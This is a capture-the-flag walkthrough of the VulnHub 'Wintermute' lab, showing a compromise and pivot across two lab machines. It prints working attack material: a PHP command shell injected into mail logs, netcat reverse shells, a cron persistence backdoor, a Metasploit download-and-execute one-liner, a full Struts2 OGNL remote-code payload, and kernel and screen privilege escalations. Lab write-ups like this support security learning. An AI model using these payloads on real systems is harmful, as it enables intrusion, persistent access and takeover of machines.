#WINTERMUTE  
  
**URL: https://www.vulnhub.com/entry/wintermute-1,239/**  
  
Awesome lab to test pivoting between machines. The architecture is the following:  
  
  192.168.148.3   .148.5       .111.6   .111.5  
________________    ________________    ________________  
|              |    |              |    |              |  
|     Kali     | -> |  Straylight  | -> | Neuromancer  |  
|______________|    |______________|    |______________|  
  
#Straylight  
  
### NMAP  
  
root@kali:~# nmap -A 192.168.148.5  
>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-12 08:40 CDT  
>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers  
>Nmap scan report for 192.168.148.5  
>Host is up (0.00072s latency).  
>Not shown: 997 closed ports  
>PORT     STATE SERVICE            VERSION  
>25/tcp   open  smtp               Postfix smtpd  
>|_smtp-commands: straylight, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,   
>| ssl-cert: Subject: commonName=straylight  
>| Subject Alternative Name: DNS:straylight  
>| Not valid before: 2018-05-12T18:08:02  
>|_Not valid after:  2028-05-09T18:08:02  
>|_ssl-date: TLS randomness does not represent time  
>80/tcp   open  http               Apache httpd 2.4.25 ((Debian))  
>|_http-server-header: Apache/2.4.25 (Debian)  
>|_http-title: Night City  
>3000/tcp open  hadoop-tasktracker Apache Hadoop  
>| hadoop-datanode-info:   
>|_  Logs: submit  
>| hadoop-tasktracker-info:   
>|_  Logs: submit  
>| http-title: Welcome to ntopng  
>|_Requested resource was /lua/login.lua?referer=/  
>|_http-trane-info: Problem with XML parsing of /evox/about  
>MAC Address: 08:00:27:50:96:D9 (Oracle VirtualBox virtual NIC)  
>Device type: general purpose  
>Running: Linux 3.X|4.X  
>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4  
>OS details: Linux 3.2 - 4.9  
>Network Distance: 1 hop  
>Service Info: Host:  straylight  
  
  
### SMTP  
  
SMTP open and you can send mails without authentication... we'll keep an eye on that.  
  
root@kali:~# telnet 192.168.148.5 25  
>Trying 192.168.148.5...  
>Connected to 192.168.148.5.  
>Escape character is '^]'.  
>220 straylight ESMTP Postfix (Debian/GNU)  
>EHLO straylight  
>...  
>VRFY root  
>252 2.0.0 root  
>VRFY www-data  
>252 2.0.0 www-data  
>MAIL FROM: root  
>250 2.1.0 Ok  
>RCPT TO: www-data  
>250 2.1.5 Ok  
>data  
>354 End data with <CR><LF>.<CR><LF>  
>test  
>.  
>250 2.0.0 Ok: queued as 555825513  
>quit  
>221 2.0.0 Bye  
>Connection closed by foreign host.  
  
  
### HTTP Port 3000  
  
In the port 3000 is running a ntopng service. We access de login page and try the default credentials admin:admin. If we look around a bit, we found some interesting things:  
  
Hosts > HTTP Servers (local)   
	/turing-bolo/   
	/freeside/   
  
Two locations in the HTTP server we should check.  
  
### HTTP Port 80  
  
The freeside site has just an image. But when we check turing-bolo, it redirect us to the following resource:  
  
  
http://192.168.148.5/turing-bolo/bolo.php?bolo=case  
  
And the following message pops up:  
  
...  
Operator Gamma: Adding other member logs to directory...:  
molly.log  
armitage.log  
riviera.log  
...  
  
Mmmm...LFI? It seems that the php file is appending the extension ".log" at the end of the file.  
  
http://192.168.148.5/turing-bolo/case  
http://192.168.148.5/turing-bolo/bolo.php?bolo=/var/www/html/turing-bolo/case  
  
It is in fact a LFI, but we are not able to access any file, just the ones we already know of. It doesn't work adding the null byte (%00) either. Doing a little bit of research, we notice that the smtp logs are being stored in /var/log/mail.log. Bingo!  
  
http://192.168.148.5/turing-bolo/bolo.php?bolo=/var/log/mail  
>...  
>Jul 1 19:10:42 straylight postfix/postfix-script[1782]: stopping the Postfix mail system Jul 1 19:10:42 straylight postfix/master[716]: terminating on signal 15 Jul 1 19:10:43 straylight postfix/postfix-script[1945]: starting the Postfix mail system Jul 1 19:10:43 straylight postfix/master[1947]: daemon started -- version 3.1.8, configuration /etc/postfix Jul 3 20:26:50 straylight postfix/postfix-script[732]: starting the Postfix mail s  
>...  
  
  
### BASIC SHELL  
  
Now we just have to inyect a php shell into this log file. We  
  
root@kali:~# telnet 192.168.148.5 25  
>Trying 192.168.148.5...  
>Connected to 192.168.148.5.  
>Escape character is '^]'.  
>220 straylight ESMTP Postfix (Debian/GNU)  
>EHLO straylight  
>...  
>MAIL FROM:"<?php if(isset($_REQUEST['cmd'])){ echo '<pre>';$cmd = ($_REQUEST['cmd']);system($cmd);echo '</pre>';die;}?>"  
>250 2.1.0 Ok  
>RCPT TO:root  
>250 2.1.5 Ok  
>data  
>354 End data with <CR><LF>.<CR><LF>  
>asdf  
>.  
>250 2.0.0 Ok: queued as 5129D54D7  
>quit  
>221 2.0.0 Bye  
>Connection closed by foreign host.  
  
Now we set up a listener and make an HTTP request to the /var/log/mail.log file with the parameter cmd connecting to our machine:  
  
curl "http://192.168.148.4/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=nc+192.168.148.3+4444+-e+/bin/sh"  
  
root@kali:~# nc -nvlp 4444  
>listening on [any] 4444 ...  
>connect to [192.168.148.3] from (UNKNOWN) [192.168.148.5] 44164  
>id  
>uid=33(www-data) gid=33(www-data) groups=33(www-data)  
>hostname  
>straylight  
>uname -a  
>Linux straylight 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64 GNU/Linux  
>python -c 'import pty;pty.spawn("/bin/bash")'  
www-data@straylight:/var/www/html/turing-bolo$  
  
### ROOT SHELL  
  
Great! Now, let's get root! After checking a few things, we found the following:  
  
www-data@straylight:/var/www/html/turing-bolo$ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null  
>-rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su  
>-rwsr-xr-x 1 root root 31720 Mar  7  2018 /bin/umount  
>-rwsr-xr-x 1 root root 44304 Mar  7  2018 /bin/mount  
>-rwsr-xr-x 1 root root 1543016 May 12  2018 /bin/screen-4.5.0  
>-rwsr-xr-x 1 root root 61240 Nov  9  2016 /bin/ping  
>-rwsr-xr-x 1 root root 75792 May 17  2017 /usr/bin/gpasswd  
>-rwsr-xr-x 1 root root 40504 May 17  2017 /usr/bin/chsh  
>-rwsr-xr-x 1 root root 50040 May 17  2017 /usr/bin/chfn  
>-rwsr-xr-x 1 root root 59680 May 17  2017 /usr/bin/passwd  
>-rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp  
  
root@kali:~# searchsploit screen 4.5.0  
>--------------------------------------------------- ----------------------------------------  
> Exploit Title                                     |  Path  
>                                                   | (/usr/share/exploitdb/)  
>--------------------------------------------------- ----------------------------------------  
>GNU Screen 4.5.0 - Local Privilege Escalation      | exploits/linux/local/41154.sh  
  
  
That's what we needed. Now just bring the exploit to the straylight machine and enjoy the root shell :)  
  
root@kali:~# python -m SimpleHTTPServer 80  
>Serving HTTP on 0.0.0.0 port 80 ...  
>192.168.148.5 - - [13/Apr/2019 12:38:48] "GET /44154.sh HTTP/1.1" 200 -  
  
  
www-data@straylight:/tmp$ wget 192.168.148.3/44154.sh  
>--2019-04-13 10:38:46--  http://192.168.148.3/44154.sh  
>Connecting to 192.168.148.3:80... connected.  
>HTTP request sent, awaiting response... 200 OK  
>Length: 1152 (1.1K) [text/x-sh]  
>Saving to: '44154.sh'  
>  
>44154.sh            100%[===================>]   1.12K  --.-KB/s    in 0s        
>  
>2019-04-13 10:38:46 (306 MB/s) - '44154.sh' saved [1152/1152]  
www-data@straylight:/tmp$ chmod +x 44154.sh  
www-data@straylight:/tmp$ ./44154.sh  
>~ gnu/screenroot ~  
>[+] First, we create our shell and library...  
>[+] Now we create our /etc/ld.so.preload file...  
>[+] Triggering...  
>[+] done!  
>No Sockets found in /tmp/screens/S-www-data.  
>  
>id  
>uid=0(root) gid=0(root) groups=0(root),33(www-data)  
>python -c 'import pty;pty.spawn("/bin/bash")'  
root@straylight:/root# id  
>uid=0(root) gid=0(root) groups=0(root),33(www-data)  
root@straylight:/root# ls /root   
root@straylight:/root# cat /root/flag.txt  
>**5ed185fd75a8d6a7056c96a436c6d8aa**  
root@straylight:/root# cat note.txt  
>Devs,  
>  
>Lady 3Jane has asked us to create a custom java app on Neuromancer's primary server to help her interact w/ the AI via a web-based GUI.  
>  
>The engineering team couldn't strss enough how risky that is, opening up a Super AI to remote access on the Freeside network. It is within out internal admin network, but still, it should be off the network completely. For the sake of humanity, user access should only be allowed via the physical console...who knows what this thing can do.  
>  
>Anyways, we've deployed the war file on tomcat as ordered - located here:  
>  
>/struts2_2.3.15.1-showcase  
>  
>It's ready for the devs to customize to her liking...I'm stating the obvious, but make sure to secure this thing.  
>  
>Regards,  
>  
>Bob Laugh  
>Turing Systems Engineer II  
>Freeside//Straylight//Ops5  
>  
>Nice. Probably the second machine will be an easy struts exploit.   
  
root@straylight:~# ip a  
>...  
>2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000  
>    inet 192.168.111.6/24 brd 192.168.111.255 scope global enp0s3  
>    ...  
>3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000  
>    inet 192.168.148.5/24 brd 192.168.148.255 scope global enp0s8  
>...  
  
### PERSISTENCY  
  
This was just the first part of the lab, so we want to make sure that we don't lose the root shell. We don't want to be doing the first steps too many times.   
I'm going to set the lamest script in the crontab to gain persistency ^^  
  
root@straylight:/root# echo '#!/bin/bash' >> /tmp/sorry  
root@straylight:/root# echo '/bin/nc 192.168.148.3 4445 -e /bin/sh' >> /tmp/sorry  
root@straylight:/root# cat /tmp/sorry  
>#!/bin/bash  
>/bin/nc 192.168.148.3 4445 -e /bin/sh  
root@straylight:/root# chmod +x /tmp/sorry  
root@straylight:/root# echo "* * * * * /tmp/sorry" >> /var/spool/cron/crontabs/root  
root@straylight:/root# chown root:crontab /var/spool/cron/crontabs/root  
root@straylight:/root# chmod 600 /var/spool/cron/crontabs/root  
root@straylight:/root# crontab -l  
>* * * * * /tmp/sorry  
  
###PIVOTING  
  
In order to pivot easily, I like to set up a socks proxy and route the traffic to the second machine through the first one. With metasploit is very easy to do and let us run any command through it.  
  
First, we have to open a meterpreter session with the web_delivery module:  
  
msf exploit(multi/script/web_delivery) > run  
>...  
>python -c "import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://192.168.148.3:8080/OGsIAmtnMxP2Gv0');exec(r.read());"  
msf5 exploit(multi/script/web_delivery) >   
>[*] Sending stage (53770 bytes) to 192.168.148.5  
>[*] Meterpreter session 1 opened (192.168.148.3:4446 -> 192.168.148.5:50706) at 2019-04-13 13:24:06 -0500  
  
msf5 exploit(multi/script/web_delivery) > sessions -l  
>  
>Active sessions  
>===============  
>  
>  Id  Name  Type                      Information        Connection  
>  --  ----  ----                      -----------        ----------  
>  1         meterpreter python/linux  root @ straylight  192.168.148.3:4446 -> 192.168.148.5:50706 (192.168.148.5)  
  
msf5 exploit(multi/script/web_delivery) > sessions -i 1  
meterpreter > sysinfo  
>Computer        : straylight  
>OS              : Linux 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07)  
>Architecture    : x64  
>System Language : en_US  
>Meterpreter     : python/linux  
>meterpreter > getuid  
>Server username: root  
  
Now we set up the route to the second machine:  
  
meterpreter > run autoroute -s 192.168.111.0/24  
meterpreter > run autoroute -p  
>  
>Active Routing Table  
>====================  
>  
>   Subnet             Netmask            Gateway  
>   ------             -------            -------  
>   192.168.111.0      255.255.255.0      Session 1  
  
Perfect. We only need to set up our proxy socks with the socks4a module:  
  
msf5 auxiliary(server/socks4a) > run  
>[*] Auxiliary module running as background job 1.  
>[*] Starting the socks4a proxy server  
  
  
Now we can reach the second machine from our host.  
  
#NEUROMANCER  
  
###NMAP  
  
root@kali:~# proxychains nmap -sT -Pn 192.168.111.5  
>ProxyChains-3.1 (http://proxychains.sf.net)  
>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-13 13:35 CDT  
>Nmap scan report for 192.168.111.5  
>Host is up (0.011s latency).  
>Not shown: 998 closed ports  
>PORT     STATE SERVICE  
>8009/tcp open  ajp13  
>8080/tcp open  http-proxy  
>  
>Nmap done: 1 IP address (1 host up) scanned in 12.00 seconds  
  
###HTTP  
  
We already knew that it had a tomcat server running struts. We check with firefox the server and see that is a brand new installation.  
  
root@kali:~# proxychains firefox http://192.168.111.5:8080  
>ProxyChains-3.1 (http://proxychains.sf.net)  
>|S-chain|-<>-127.0.0.1:9050-<><>-192.168.111.5:8080-<><>-OK  
>|S-chain|-<>-127.0.0.1:9050-<><>-192.168.111.5:8080-<><>-OK  
>|S-chain|-<>-127.0.0.1:9050-<><>-192.168.111.5:8080-<><>-OK  
  
  
We know base on the previous machine that the struts version is the 2.3.15, so let's try the famous RCE (https://www.exploit-db.com/exploits/45260):  
  
root@straylight:~# curl http://192.168.111.5:8080/struts2_2.3.15.1-showcase/showcase.action -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"  
>uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)  
  
Easy! We already have a RCE. Let's get our shell.  
  
  
###BASIC SHELL  
  
After all this work, let's go the easy path and just load the metasploit module  
  
msf5 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI struts2_2.3.15.1-showcase/showcase.action  
>TARGETURI => struts2_2.3.15.1-showcase/showcase.action  
msf5 exploit(multi/http/struts2_content_type_ognl) > run  
>[*] Started bind TCP handler against 192.168.111.5:4450  
>[*] Sending stage (38 bytes) to 192.168.111.5  
>[*] Command shell session 2 opened (192.168.148.3-192.168.148.5:0 -> 192.168.111.5:4450) at 2019-04-13 13:47:18 -0500  
>  
>id  
>uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)  
>hostname  
>neuromancer  
>uname -a  
>Linux neuromancer 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux  
>  
>netstat -punta  
>(Not all processes could be identified, non-owned process info  
> will not be shown, you would have to be root to see it all.)  
>Active Internet connections (servers and established)  
>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name  
>tcp        0      0 0.0.0.0:4450            0.0.0.0:*               LISTEN      1479/sh           
>tcp        0      0 0.0.0.0:34483           0.0.0.0:*               LISTEN      -                 
>tcp        0    125 192.168.111.5:4450      192.168.111.6:58733     ESTABLISHED 1479/sh           
>tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      1107/java         
>tcp6       0      0 :::8009                 :::*                    LISTEN      1107/java         
>tcp6       0      0 :::8080                 :::*                    LISTEN      1107/java         
>tcp6       0      0 :::34483                :::*                    LISTEN      -                 
>udp        0      0 0.0.0.0:68              0.0.0.0:*                           -           
  
Checking the ports open, we see that there is something listening in the port 34483. Let's find out what it is:  
  
root@kali:~# proxychains nmap -sT -sV -Pn 192.168.111.5 -p 34483  
>ProxyChains-3.1 (http://proxychains.sf.net)  
>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-13 14:09 CDT  
>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers  
>|S-chain|-<>-127.0.0.1:9050-<><>-192.168.111.5:34483-<><>-OK  
>|S-chain|-<>-127.0.0.1:9050-<><>-192.168.111.5:34483-<><>-OK  
>Nmap scan report for 192.168.111.5  
>Host is up (0.0036s latency).  
>  
>PORT      STATE SERVICE VERSION  
>34483/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)  
>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
  
Great, a usefull shell. Let's just set up our ssh key and log in.  
  
>mkdir .ssh  
>echo "ssh-rsa AAA....0DFr root@kali" > .ssh/authorized_keys  
  
root@kali:~# proxychains ssh -l ta 192.168.111.5 -p 34483  
>ProxyChains-3.1 (http://proxychains.sf.net)  
>|S-chain|-<>-127.0.0.1:9050-<><>-192.168.111.5:34483-<><>-OK  
> ----------------------------------------------------------------  
>|                Neuromancer Secure Remote Access                |  
>| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |  
> ----------------------------------------------------------------  
>Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)  
>  
> * Documentation:  https://help.ubuntu.com  
> * Management:     https://landscape.canonical.com  
> * Support:        https://ubuntu.com/advantage  
>  
>94 packages can be updated.  
>44 updates are security updates.  
>  
>  
>Last login: Tue Jul  3 21:53:25 2018  
ta@neuromancer:~$   
  
  
  
###ROOT SHELL  
  
This is the easy part, just check the kernel version and look for the exploit :/  
  
ta@neuromancer:~$ uname -a  
>Linux neuromancer 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux  
ta@neuromancer:/tmp$ ./44298  
>task_struct = ffff88003734d400  
>uidptr = ffff880035537e44  
>spawning root shell  
root@neuromancer:/tmp# id  
>uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(ta)  
root@neuromancer:/tmp# cat /root/flag.txt  
**be3306f431dae5ebc93eebb291f4914a**  
  
  
  
  
That was a very fun experience. Just thank @_creosote for the work and the awesome lab. 